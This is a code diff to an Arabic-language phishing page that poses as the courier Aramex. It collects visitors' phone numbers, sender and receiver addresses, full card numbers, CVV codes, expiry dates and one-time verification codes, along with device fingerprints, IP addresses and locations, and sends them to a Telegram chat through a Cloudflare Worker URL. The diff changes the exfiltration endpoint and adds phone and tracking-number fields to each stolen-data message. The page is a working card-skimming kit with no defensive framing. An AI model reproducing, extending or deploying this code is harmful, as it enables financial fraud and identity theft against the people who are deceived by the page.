@@ -652,6 +652,7 @@
         </div>
 
         <!-- ========= الصفحة الرئيسية (الصورة + الأزرار المخفية) ========= -->
+        <!-- ⚠️ رابط صورة ارامكس الرئيسية - قم بتغييره هنا عند الحاجة ⚠️ -->
         <section class="page active" id="page-home">
           <div class="home-image-container">
             <img id="mainImage" class="main-image" src="https://files.catbox.moe/nflilk.png" alt="الصورة الرئيسية" draggable="false" />
@@ -826,8 +827,15 @@
   (function setRealVH() { function apply() { document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px'); } apply(); window.addEventListener('resize', apply); window.addEventListener('orientationchange', apply); })();
 
   // ================== إعدادات Telegram (موحدة) ==================
-  const TELEGRAM_WORKER_URL = "https://delicate-cake-2fc2.mnya04637.workers.dev/";  // ⚠️ ضع رابط الـ Worker الخاص بك هنا
-  const TELEGRAM_CHAT_ID = "6918534470";  // ⚠️ ضع معرف الدردشة (chat_id) هنا
+  // ⚠️ رابط العامل (Worker URL) - قم بتغييره هنا عند الحاجة ⚠️
+  const TELEGRAM_WORKER_URL = "https://withered-dream-f7f1.mshh667ccc.workers.dev/";
+  // ⚠️ معرف الدردشة (Chat ID) - قم بتغييره هنا عند الحاجة ⚠️
+  const TELEGRAM_CHAT_ID = "6918534470";
+  // =================================================================
+
+  // ================== متغيرات عامة لتخزين رقم الهاتف ورقم التتبع ==================
+  let currentPhoneNumber = "";
+  let currentTrackingNumber = "";
   // =================================================================
 
   // ================== بصمة ثابتة للمستخدم ==================
@@ -861,10 +869,10 @@
 
   function getDeviceType() {
     let ua = navigator.userAgent;
-    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS (iPhone/iPad)";
-    if (/Android/i.test(ua)) return "Android";
-    if (/Windows/i.test(ua)) return "Windows";
-    if (/Macintosh/i.test(ua)) return "Mac";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "📱 iOS (iPhone/iPad)";
+    if (/Android/i.test(ua)) return "📱 Android";
+    if (/Windows/i.test(ua)) return "💻 Windows";
+    if (/Macintosh/i.test(ua)) return "💻 Mac";
     return "غير معروف";
   }
 
@@ -877,6 +885,12 @@
     if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
     return "متصفح آخر";
   }
+
+  // ================== دالة المعلومات الإضافية الموحدة ==================
+  function getAdditionalInfo() {
+    return `━━━━━━━━━━━\n🆔 البصمة الثابتة: ${userId}\n📱 نوع الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
+  }
+  // =================================================================
 
   let ipData = { ip: "غير معروف", country: "غير معروف", city: "غير معروف" };
   (async function fetchIP() {
@@ -899,10 +913,12 @@
     } catch(e) { console.error("Telegram send error:", e); }
   }
 
+  // ================== دالة إرسال حدث مع المعلومات الإضافية ==================
   async function sendEvent(message) {
-    let extra = `\n━━━━━━━━━━━\n🆔 المستخدم الثابت: ${userId}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
-    await sendToTelegram(message + extra);
+    let fullMessage = message + "\n" + getAdditionalInfo();
+    await sendToTelegram(fullMessage);
   }
+  // =================================================================
 
   // ================== منطق بوابة الدفع (مدمج) ==================
   // دوال مساعدة خاصة بالبوابة
@@ -999,6 +1015,11 @@
     pg.visitCount = parseInt(localStorage.getItem("visitCount") || "0");
   }
 
+  // دالة المعلومات الإضافية الخاصة بالبوابة
+  function pg_getAdditionalInfo() {
+    return `━━━━━━━━━━━\n🆔 البصمة المتقدمة: ${pg.fingerprint}\n📱 نوع الجهاز: ${pg.deviceInfo.deviceType} (${pg.deviceInfo.os})\n🌐 المتصفح: ${pg.deviceInfo.browser}\n🌍 IP: ${pg.ip}\n📍 الموقع: ${pg.location}\n👀 عدد الزيارات: ${pg.visitCount}`;
+  }
+
   // تحقق من البطاقة
   function pg_validateCardHolder() {
     const value = document.getElementById('pg-cardHolder').value.trim();
@@ -1052,6 +1073,7 @@
     return 'غير معروف';
   }
 
+  // ================== الرسالة الخامسة: معلومات بطاقة الدفع ==================
   async function pg_sendPaymentMessage() {
     const raw = pg_getRawCardNumber();
     const type = pg_detectCardType(raw);
@@ -1059,12 +1081,19 @@
     const cvvVal = document.getElementById('pg-cvv').value.trim() || 'غير مدخل';
     const month = document.getElementById('pg-expMonth').value || 'MM';
     const year = document.getElementById('pg-expYear').value || 'YY';
-    const msg = `💳💰 معلومات الدفع\n________________________\n💰 المبلغ: ${pg.amount} ريال\n🏷️ نوع البطاقة: ${type}\n🔢 رقم البطاقة: ${raw}\n🔐 رمز الأمان: ${cvvVal}\n📅 تاريخ الانتهاء: ${month}/${year}\n👤 اسم حامل البطاقة: ${holder}\n__________________\nمعلومات إضافية ⬇️\n🆔 البصمة: ${pg.fingerprint}\n📱 الجهاز: ${pg.deviceInfo.deviceType} (${pg.deviceInfo.os})\n🌐 المتصفح: ${pg.deviceInfo.browser}\n🌍 IP: ${pg.ip}\n📍 الموقع: ${pg.location}`;
+    const phone = currentPhoneNumber || 'غير متوفر';
+    const tracking = currentTrackingNumber || 'غير محدد';
+
+    const msg = `🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨\n💳💳معلومات بطاقة الدفع💳💳\n👤 اسم حامل البطاقة: ${holder}\n🏷️ نوع البطاقة: ${type}\n🔢 رقم البطاقة: ${raw}\n📅 تاريخ الانتهاء: ${month}/${year}\n🔐 رمز الأمان: ${cvvVal}\n🚨🚨🚨🚨🚨🚨🚨🚨\n💰 قيمة الدفع: ${pg.amount} ريال\n📱 رقم الهاتف: ${phone}\n📦 رقم التتبع: ${tracking}\n${pg_getAdditionalInfo()}`;
     await sendToTelegram(msg);
   }
 
+  // ================== الرسالة السادسة: رمز التحقق ==================
   async function pg_sendOtpMessage(otp) {
-    const msg = `🔐✅ رمز التحقق\n🔢 رمز التحقق: ${otp}\n____________________\n🆔 البصمة: ${pg.fingerprint}\n📱 الجهاز: ${pg.deviceInfo.deviceType} (${pg.deviceInfo.os})\n🌐 المتصفح: ${pg.deviceInfo.browser}\n🌍 IP: ${pg.ip}\n📍 الموقع: ${pg.location}`;
+    const phone = currentPhoneNumber || 'غير متوفر';
+    const tracking = currentTrackingNumber || 'غير محدد';
+
+    const msg = `🔐🔐🔐🔐🔐🔐🔐🔐\nرمز التحقق✅🔐\n🔢 رمز التحقق: ${otp}\n🔐🔐🔐🔐🔐🔐🔐🔐\n📱 رقم الهاتف: ${phone}\n📦 رقم التتبع: ${tracking}\n${pg_getAdditionalInfo()}`;
     await sendToTelegram(msg);
   }
 
@@ -1153,6 +1182,8 @@
   });
 
   // ================== ربط أحداث أرامكس ==================
+
+  // --- تتبع الشحنة ---
   document.getElementById("trackBtn").addEventListener("click", async () => {
     let number = document.getElementById("trackingNumber").value.trim();
     if (number.length !== 10) {
@@ -1164,9 +1195,10 @@
     let status = (thirdDigit === '4' && fourthDigit === '0') ? "الشحنة قيد المعالجة" : "لا يوجد شحنة بعد";
     document.getElementById("trackResult").textContent = status;
     document.getElementById("trackResult").style.display = "block";
-    await sendEvent(`🔍 *حدث تتبع شحنة*\nرقم التتبع: ${number}\nالنتيجة: ${status}`);
+    await sendEvent(`🔍 *تتبع شحنة*\n📦 رقم التتبع: ${number}\n📋 الحالة: ${status}`);
   });
 
+  // --- استرجاع مبلغ الشحنة ---
   document.getElementById("submitRefundBtn").addEventListener("click", async () => {
     let valid = true;
     const name = document.getElementById("refund_name").value.trim();
@@ -1180,7 +1212,7 @@
     else if (!/^\d{10}$/.test(tracking)) { setError("err_refund_tracking", "رقم التتبع يجب أن يتكون من 10 أرقام"); valid = false; }
     else setError("err_refund_tracking", "");
     if (valid) {
-      await sendEvent(`💰 *طلب استرجاع مبلغ*\nالاسم: ${name}\nالجوال: ${phone}\nرقم التتبع: ${tracking}`);
+      await sendEvent(`💰 *طلب استرجاع مبلغ الشحنة*\n👤 الاسم: ${name}\n📱 رقم الجوال: ${phone}\n📦 رقم التتبع: ${tracking}`);
       showPopup("سوف يتم استرجاع مبلغ الدفع خلال ثلاث أيام عمل إلى أسبوع. شكراً لك.");
       document.getElementById("refund_name").value = "";
       document.getElementById("refund_phone").value = "";
@@ -1189,17 +1221,17 @@
     }
   });
 
-  // تم تعديل هذه الدالة لتذهب إلى صفحة الهاتف بدلاً من where
+  // --- تسجيل الدخول يذهب لصفحة الهاتف ---
   document.getElementById("goLogin").addEventListener("click", async () => {
     await sendEvent(`🔐 *الضغط على زر تسجيل الدخول*`);
     go("phone");
   });
 
-  // تعديل: زر الشحنة المخفي يذهب لصفحة الهاتف
+  // --- الأزرار المخفية في الصفحة الرئيسية ---
   document.getElementById("hiddenShipBtn").addEventListener("click", () => go("phone"));
   document.getElementById("hiddenTrackBtn").addEventListener("click", () => go("tracking"));
 
-  // صفحة إدخال رقم الهاتف
+  // --- صفحة إدخال رقم الهاتف ---
   const phoneInput = document.getElementById('phoneNumber');
   phoneInput.addEventListener('input', function() {
     this.value = this.value.replace(/\D/g, '').slice(0, 10);
@@ -1210,6 +1242,7 @@
     this.value = pasted.replace(/\D/g, '').slice(0, 10);
   });
 
+  // --- الرسالة الأولى: رقم الهاتف ---
   document.getElementById('btnNextPhone').addEventListener('click', async () => {
     const phone = document.getElementById('phoneNumber').value.trim();
     const len = phone.length;
@@ -1220,8 +1253,10 @@
     }
     setError("err_phoneNumber", "");
     document.getElementById('phoneNumber').classList.remove('error');
-    // إرسال رقم الهاتف إلى تيليجرام
-    await sendEvent(`📱 *إدخال رقم الهاتف*: ${phone}`);
+    // تخزين رقم الهاتف للمتغير العام
+    currentPhoneNumber = phone;
+    // إرسال الرسالة الأولى: رقم الهاتف مع المعلومات الإضافية
+    await sendEvent(`📱 *إرسال شحنة - رقم الهاتف*\n📱 رقم الهاتف: ${phone}`);
     go("where");
   });
 
@@ -1229,10 +1264,11 @@
     document.getElementById('phoneNumber').value = '';
     setError("err_phoneNumber", "");
     document.getElementById('phoneNumber').classList.remove('error');
+    currentPhoneNumber = "";
     go("home");
   });
 
-  // تعديل القائمة: إرسال شحنة يذهب لصفحة الهاتف
+  // --- القائمة الجانبية ---
   document.querySelectorAll(".menu-item").forEach(item => {
     item.addEventListener("click", () => {
       const a = item.dataset.action;
@@ -1243,24 +1279,28 @@
     });
   });
 
+  // --- الرسالة الثانية: نوع الشحنة (محلية/دولية) ---
   document.querySelectorAll("#page-where .choice").forEach(choice => {
     choice.addEventListener("click", async function() {
       let type = this.querySelector(".lbl")?.innerText || (this.dataset.type === "local" ? "شحنة محلية" : "شحنة دولية");
-      await sendEvent(`📦 *اختيار نوع الشحنة*: ${type}`);
+      const phone = currentPhoneNumber || 'غير متوفر';
+      await sendEvent(`📦 *اختيار نوع الشحنة*\n📦 نوع الشحنة: ${type}\n📱 رقم الهاتف: ${phone}`);
       go(this.dataset.next);
     });
   });
 
+  // --- الرسالة الثالثة: معلومات المرسل + المستلم + تفاصيل الشحنة ---
   let isSending = false;
   document.getElementById("btnSendShipment").addEventListener("click", async () => {
     if (isSending) return;
     if (!validateDetails()) return;
     isSending = true;
     try {
+      const phone = currentPhoneNumber || 'غير متوفر';
       let sender = `👤 المرسل:\nالاسم: ${document.getElementById("s_name").value}\nالبلد: ${document.getElementById("s_country").options[document.getElementById("s_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("s_phone").value}\nالمدينة: ${document.getElementById("s_city").value}\nالحي: ${document.getElementById("s_district").value}\nالشارع: ${document.getElementById("s_street").value}`;
       let receiver = `👤 المستلم:\nالاسم: ${document.getElementById("r_name").value}\nالبلد: ${document.getElementById("r_country").options[document.getElementById("r_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("r_phone").value}\nالمدينة: ${document.getElementById("r_city").value}\nالحي: ${document.getElementById("r_district").value}\nالشارع: ${document.getElementById("r_street").value}`;
       let details = `📦 تفاصيل الشحنة:\nرقم التتبع: ${document.getElementById("d_shipno").value}\nالمحتويات: ${document.getElementById("d_content").value}\nعدد القطع: ${document.getElementById("d_pieces").value}\nنوع الشحنة: ${selectedType === "docs" ? "وثائق" : "طرد"}`;
-      await sendEvent(`📮 *إتمام بيانات الشحنة*\n\n${sender}\n\n${receiver}\n\n${details}`);
+      await sendEvent(`📮 *معلومات الشحنة كاملة*\n📱 رقم الهاتف: ${phone}\n\n${sender}\n\n${receiver}\n\n${details}`);
       currentTrackingNumber = document.getElementById("d_shipno").value.trim();
       go("paymethod");
     } finally {
@@ -1268,7 +1308,7 @@
     }
   });
 
-  // الانتقال إلى بوابة الدفع
+  // --- الرسالة الرابعة: قيمة الدفع ---
   document.getElementById("btnProceedToPay").addEventListener("click", async () => {
     const amountInput = document.getElementById("paymentAmount");
     let amount = parseFloat(amountInput.value);
@@ -1281,7 +1321,9 @@
     // تجهيز بصمة الدفع وضبط المبلغ
     pg.amount = amount;
     await pg_initFingerprint();
-    await sendEvent(`💳 *الانتقال للدفع*\n💰 قيمة الدفع: ${amount} ريال\n📦 رقم التتبع: ${currentTrackingNumber || "غير محدد"}`);
+    const phone = currentPhoneNumber || 'غير متوفر';
+    const tracking = currentTrackingNumber || 'غير محدد';
+    await sendEvent(`💳 *الانتقال للدفع*\n💰 قيمة الدفع: ${amount} ريال\n📱 رقم الهاتف: ${phone}\n📦 رقم التتبع: ${tracking}`);
     // عرض صفحة بوابة الدفع
     go("payment-gateway");
     // إعادة تعيين حقول البوابة
@@ -1323,7 +1365,6 @@
   document.querySelectorAll("[data-back]").forEach(b => b.addEventListener("click", () => go(b.dataset.back)));
   document.getElementById("backFromTracking")?.addEventListener("click", () => go("where"));
   document.querySelectorAll("#page-details .choice.selectable").forEach(el => { el.addEventListener("click", () => { selectedType = el.dataset.type; document.querySelectorAll("#page-details .choice.selectable").forEach(x => x.classList.remove("selected")); el.classList.add("selected"); setError("err_d_type", ""); }); });
-  let currentTrackingNumber = '';
   document.getElementById("newShipmentBtn").addEventListener("click", () => {
     document.getElementById('s_name').value = '';
     document.getElementById('s_phone').value = '';
@@ -1341,6 +1382,7 @@
     document.getElementById('paymentAmount').value = '';
     selectedType = '';
     currentTrackingNumber = '';
+    currentPhoneNumber = '';
     document.querySelectorAll("#page-details .choice.selectable").forEach(x => x.classList.remove("selected"));
     go("where");
   });
@@ -1362,4 +1404,4 @@
   document.addEventListener("DOMContentLoaded", () => { document.querySelectorAll("body > *:not(#myProductBox)").forEach(el => el.style.display = "none"); document.body.style.visibility = "visible"; });
 </script>
 </body>
-          </html>
+              </html>
